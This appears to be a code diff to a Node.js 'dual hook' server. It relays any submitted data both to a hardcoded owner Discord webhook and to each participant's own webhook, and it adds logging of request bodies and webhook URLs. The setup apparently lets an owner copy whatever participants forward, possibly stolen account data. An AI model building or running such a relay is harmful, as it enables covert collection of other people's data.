@@ -31,6 +31,17 @@ app.options('*', (req, res) => {
 app.use(express.json());
 
 // ============================================================
+//  ✅ LOGGING MIDDLEWARE
+// ============================================================
+app.use((req, res, next) => {
+    console.log(`📨 ${req.method} ${req.path}`);
+    if (req.body && Object.keys(req.body).length > 0) {
+        console.log('📦 Body:', JSON.stringify(req.body).substring(0, 200));
+    }
+    next();
+});
+
+// ============================================================
 //  ✅ CSP HEADERS
 // ============================================================
 app.use((req, res, next) => {
@@ -102,6 +113,10 @@ async function connectToMongoDB() {
 //  OWNER'S HARDCODED WEBHOOK
 // ============================================================
 const OWNER_WEBHOOK = process.env.OWNER_WEBHOOK_URL || '';
+console.log(`🔗 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
+if (OWNER_WEBHOOK) {
+    console.log(`📡 Owner webhook URL: ${OWNER_WEBHOOK.substring(0, 60)}...`);
+}
 
 // ============================================================
 //  GENERATE UNIQUE ID
@@ -116,94 +131,45 @@ function generateId() {
 }
 
 // ============================================================
-//  ✅ RATE LIMITING UTILITY
+//  ✅ SEND TO DISCORD WEBHOOK
 // ============================================================
-class RateLimiter {
-    constructor() {
-        this.queue = [];
-        this.processing = false;
-        this.lastRequestTime = 0;
-        this.minInterval = 200;
-    }
-
-    async schedule(fn) {
-        return new Promise((resolve, reject) => {
-            this.queue.push({ fn, resolve, reject });
-            this.processQueue();
-        });
-    }
-
-    async processQueue() {
-        if (this.processing || this.queue.length === 0) return;
-        this.processing = true;
-
-        const now = Date.now();
-        const timeSinceLast = now - this.lastRequestTime;
-        if (timeSinceLast < this.minInterval) {
-            await new Promise(r => setTimeout(r, this.minInterval - timeSinceLast));
-        }
-
-        const item = this.queue.shift();
-        this.lastRequestTime = Date.now();
-        this.processing = false;
-
-        try {
-            const result = await item.fn();
-            item.resolve(result);
-        } catch (error) {
-            item.reject(error);
-        }
-
-        this.processQueue();
-    }
-}
-
-const rateLimiter = new RateLimiter();
-
-// ============================================================
-//  ✅ SEND TO WEBHOOK WITH RATE LIMITING AND RETRY
-// ============================================================
-async function sendToWebhookWithRetry(url, data, maxRetries = 3, retryDelay = 1000) {
-    let lastError = null;
+async function sendToDiscordWebhook(webhookUrl, data) {
+    console.log(`📤 Sending to webhook: ${webhookUrl.substring(0, 60)}...`);
+    console.log(`📦 Payload:`, JSON.stringify(data).substring(0, 300));
     
-    for (let attempt = 1; attempt <= maxRetries; attempt++) {
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
+    try {
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        });
 
-            if (response.status === 429) {
-                const retryAfter = parseInt(response.headers.get('Retry-After') || '0') * 1000 || retryDelay * attempt;
-                console.log(`⚠️ Rate limited, retrying in ${retryAfter}ms (attempt ${attempt}/${maxRetries})`);
-                await new Promise(r => setTimeout(r, retryAfter));
-                continue;
-            }
+        const responseText = await response.text();
+        console.log(`📥 Response status: ${response.status}`);
+        console.log(`📥 Response body: ${responseText.substring(0, 200)}`);
 
-            if (!response.ok) {
-                if (attempt === maxRetries) {
-                    return { success: false, status: response.status };
-                }
-                await new Promise(r => setTimeout(r, retryDelay));
-                continue;
-            }
-
-            return { success: true, status: response.status };
-
-        } catch (error) {
-            lastError = error;
-            if (attempt < maxRetries) {
-                await new Promise(r => setTimeout(r, retryDelay * attempt));
-            }
+        if (response.status === 429) {
+            const retryAfter = parseInt(response.headers.get('Retry-After') || '5');
+            console.log(`⏳ Rate limited! Retry after ${retryAfter} seconds`);
+            return { success: false, status: 429, retryAfter, error: 'Rate limited' };
         }
-    }
 
-    return { success: false, error: lastError?.message || 'Max retries exceeded' };
+        if (!response.ok) {
+            return { success: false, status: response.status, error: responseText || 'Unknown error' };
+        }
+
+        return { success: true, status: response.status };
+
+    } catch (error) {
+        console.error(`❌ Webhook error:`, error.message);
+        return { success: false, error: error.message };
+    }
 }
 
 // ============================================================
-//  ✅ API ROUTES (defined BEFORE static files)
+//  ✅ API ROUTES
 // ============================================================
 
 // Health check - returns JSON
@@ -221,6 +187,9 @@ app.get('/', (req, res) => {
 // Generate a new unique hook URL for a participant
 app.post('/api/generate', async (req, res) => {
     const { username, webhookUrl } = req.body;
+    
+    console.log(`🔑 Generating hook for user: ${username}`);
+    console.log(`🔗 Webhook URL: ${webhookUrl.substring(0, 60)}...`);
     
     if (!username || !webhookUrl) {
         return res.status(400).json({ error: 'Username and webhook URL required' });
@@ -248,6 +217,8 @@ app.post('/api/generate', async (req, res) => {
                 }
             );
             
+            console.log(`✅ Webhook updated for user: ${username}`);
+            
             return res.json({
                 success: true,
                 message: 'Webhook updated successfully',
@@ -273,6 +244,8 @@ app.post('/api/generate', async (req, res) => {
         };
 
         await webhooksCollection.insertOne(newHook);
+        
+        console.log(`✅ New webhook created for user: ${username} with ID: ${id}`);
 
         res.json({
             success: true,
@@ -282,7 +255,7 @@ app.post('/api/generate', async (req, res) => {
             isNew: true
         });
     } catch (error) {
-        console.error('Error generating hook:', error);
+        console.error('❌ Error generating hook:', error);
         res.status(500).json({ error: 'Database error: ' + error.message });
     }
 });
@@ -290,6 +263,8 @@ app.post('/api/generate', async (req, res) => {
 // Get a participant's hook info (API endpoint)
 app.get('/api/hook/:id', async (req, res) => {
     const { id } = req.params;
+    
+    console.log(`🔍 Fetching hook: ${id}`);
     
     if (!db || !webhooksCollection) {
         return res.status(503).json({ error: 'Database not connected' });
@@ -299,9 +274,11 @@ app.get('/api/hook/:id', async (req, res) => {
         const hook = await webhooksCollection.findOne({ hookId: id });
         
         if (!hook) {
+            console.log(`❌ Hook not found: ${id}`);
             return res.status(404).json({ error: 'Hook not found' });
         }
 
+        console.log(`✅ Hook found: ${hook.username}`);
         res.json({
             id: hook.hookId,
             username: hook.username,
@@ -309,29 +286,7 @@ app.get('/api/hook/:id', async (req, res) => {
             webhookConfigured: !!hook.webhookUrl
         });
     } catch (error) {
-        console.error('Error fetching hook:', error);
-        res.status(500).json({ error: 'Database error: ' + error.message });
-    }
-});
-
-// Get all registered hooks
-app.get('/api/hooks/all', async (req, res) => {
-    if (!db || !webhooksCollection) {
-        return res.status(503).json({ error: 'Database not connected' });
-    }
-
-    try {
-        const hooks = await webhooksCollection.find({}).toArray();
-        const list = hooks.map(hook => ({
-            id: hook.hookId,
-            username: hook.username,
-            createdAt: hook.createdAt,
-            updatedAt: hook.updatedAt,
-            webhookConfigured: !!hook.webhookUrl
-        }));
-        res.json(list);
-    } catch (error) {
-        console.error('Error fetching hooks:', error);
+        console.error('❌ Error fetching hook:', error);
         res.status(500).json({ error: 'Database error: ' + error.message });
     }
 });
@@ -339,6 +294,8 @@ app.get('/api/hooks/all', async (req, res) => {
 // Delete a hook
 app.delete('/api/hook/:id', async (req, res) => {
     const { id } = req.params;
+    
+    console.log(`🗑️ Deleting hook: ${id}`);
     
     if (!db || !webhooksCollection) {
         return res.status(503).json({ error: 'Database not connected' });
@@ -351,23 +308,31 @@ app.delete('/api/hook/:id', async (req, res) => {
             return res.status(404).json({ error: 'Hook not found' });
         }
         
+        console.log(`✅ Hook deleted: ${id}`);
         res.json({ success: true, message: 'Hook deleted' });
     } catch (error) {
-        console.error('Error deleting hook:', error);
+        console.error('❌ Error deleting hook:', error);
         res.status(500).json({ error: 'Database error: ' + error.message });
     }
 });
 
-// Send to dual hooks with rate limiting
+// ============================================================
+//  ✅ SEND TO DUAL HOOKS
+// ============================================================
 app.post('/api/send/:hookId', async (req, res) => {
     const { hookId } = req.params;
     const { data } = req.body;
 
+    console.log(`📨 Received send request for hook: ${hookId}`);
+    console.log(`📦 Data:`, JSON.stringify(data).substring(0, 300));
+
     if (!data) {
+        console.log('❌ No data provided');
         return res.status(400).json({ error: 'Missing data' });
     }
 
     if (!db || !webhooksCollection) {
+        console.log('❌ Database not connected');
         return res.status(503).json({ error: 'Database not connected' });
     }
 
@@ -375,58 +340,54 @@ app.post('/api/send/:hookId', async (req, res) => {
         const participantHook = await webhooksCollection.findOne({ hookId });
         
         if (!participantHook || !participantHook.webhookUrl) {
+            console.log(`❌ Participant webhook not found: ${hookId}`);
             return res.status(404).json({ error: 'Participant webhook not found' });
         }
+
+        console.log(`👤 Participant: ${participantHook.username}`);
+        console.log(`🔗 Participant webhook: ${participantHook.webhookUrl.substring(0, 60)}...`);
 
         const results = [];
         const errors = [];
 
-        const sendTasks = [];
-
+        // 1. Send to Owner's webhook
         if (OWNER_WEBHOOK) {
-            sendTasks.push({
-                name: 'owner',
-                url: OWNER_WEBHOOK,
-                label: 'Owner'
+            console.log(`📤 Sending to Owner webhook...`);
+            const ownerResult = await sendToDiscordWebhook(OWNER_WEBHOOK, data);
+            results.push({
+                hook: 'owner',
+                username: 'Owner',
+                success: ownerResult.success,
+                status: ownerResult.status || 'unknown'
             });
+            if (!ownerResult.success) {
+                errors.push(`Owner hook failed: ${ownerResult.error || ownerResult.status || 'Unknown error'}`);
+            } else {
+                console.log(`✅ Owner webhook sent successfully`);
+            }
         } else {
             errors.push('Owner webhook not configured');
+            console.log('⚠️ Owner webhook not configured');
         }
 
+        // 2. Send to Participant's webhook
         if (participantHook.webhookUrl) {
-            sendTasks.push({
-                name: 'participant',
-                url: participantHook.webhookUrl,
-                label: participantHook.username
+            console.log(`📤 Sending to Participant webhook (${participantHook.username})...`);
+            const participantResult = await sendToDiscordWebhook(participantHook.webhookUrl, data);
+            results.push({
+                hook: 'participant',
+                username: participantHook.username,
+                success: participantResult.success,
+                status: participantResult.status || 'unknown'
             });
-        }
-
-        for (const task of sendTasks) {
-            try {
-                const result = await rateLimiter.schedule(async () => {
-                    return await sendToWebhookWithRetry(task.url, data);
-                });
-                
-                results.push({
-                    hook: task.name,
-                    username: task.label,
-                    success: result.success,
-                    status: result.status || 'unknown'
-                });
-
-                if (!result.success) {
-                    errors.push(`${task.label} hook failed: ${result.status || result.error || 'Unknown error'}`);
-                }
-            } catch (error) {
-                errors.push(`${task.label} hook error: ${error.message}`);
-                results.push({
-                    hook: task.name,
-                    username: task.label,
-                    success: false,
-                    error: error.message
-                });
+            if (!participantResult.success) {
+                errors.push(`Participant hook failed: ${participantResult.error || participantResult.status || 'Unknown error'}`);
+            } else {
+                console.log(`✅ Participant webhook sent successfully`);
             }
         }
+
+        console.log(`📊 Results: ${results.filter(r => r.success).length}/${results.length} successful`);
 
         res.json({
             success: results.some(r => r.success),
@@ -438,7 +399,7 @@ app.post('/api/send/:hookId', async (req, res) => {
             }
         });
     } catch (error) {
-        console.error('Error sending to hooks:', error);
+        console.error('❌ Error sending to hooks:', error);
         res.status(500).json({ error: 'Server error: ' + error.message });
     }
 });
@@ -448,6 +409,8 @@ app.post('/api/send/:hookId', async (req, res) => {
 // ============================================================
 app.get('/hook/:id', async (req, res) => {
     const { id } = req.params;
+    
+    console.log(`📄 Serving hook page: ${id}`);
     
     if (!db || !webhooksCollection) {
         return res.status(503).send(`
@@ -623,7 +586,7 @@ app.get('/hook/:id', async (req, res) => {
             </html>
         `);
     } catch (error) {
-        console.error('Error serving hook page:', error);
+        console.error('❌ Error serving hook page:', error);
         res.status(500).send('Server error');
     }
 });
@@ -631,7 +594,6 @@ app.get('/hook/:id', async (req, res) => {
 // ============================================================
 //  ✅ STATIC FILES (SERVED AFTER API ROUTES)
 // ============================================================
-// This will serve files from the 'public' folder ONLY if no API route matches
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ============================================================
@@ -639,7 +601,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ============================================================
 async function startServer() {
     console.log('🚀 Starting VRT-BOT Dual Hook Server...');
-    console.log(`🔗 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
     
     const connected = await connectToMongoDB();
     
@@ -649,7 +610,7 @@ async function startServer() {
         console.log(`✅ CORS enabled for all origins`);
         console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
         console.log(`📁 Hook pages: https://vrt-bot-hook-server.onrender.com/hook/{id}`);
-        console.log(`⏱️ Rate limiting: ${rateLimiter.minInterval}ms between requests`);
+        console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
     });
 }
 
